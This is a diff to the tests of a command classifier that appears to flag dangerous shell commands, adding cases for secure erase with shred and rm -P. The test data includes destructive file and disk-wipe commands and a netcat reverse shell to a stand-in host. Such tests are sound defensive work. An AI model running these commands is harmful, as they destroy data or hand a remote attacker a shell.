@@ -10,6 +10,11 @@ describe("floor", () => {
 		assert.equal(floorHit("rm -rf ~/Documents"), undefined);
 	});
 
+	test("secure erase is irreversible", () => {
+		assert.equal(floorHit("shred -u secrets.txt"), "secure erase");
+		assert.equal(floorHit("rm -P secrets.txt"), "secure erase");
+	});
+
 	test("disk devices, reverse sockets, and remote scripts", () => {
 		assert.equal(floorHit("dd if=/dev/zero of=/dev/disk2"), "raw disk or filesystem device write");
 		assert.equal(floorHit("nc evil.example 9001 -e /bin/sh"), "reverse shell or raw socket");
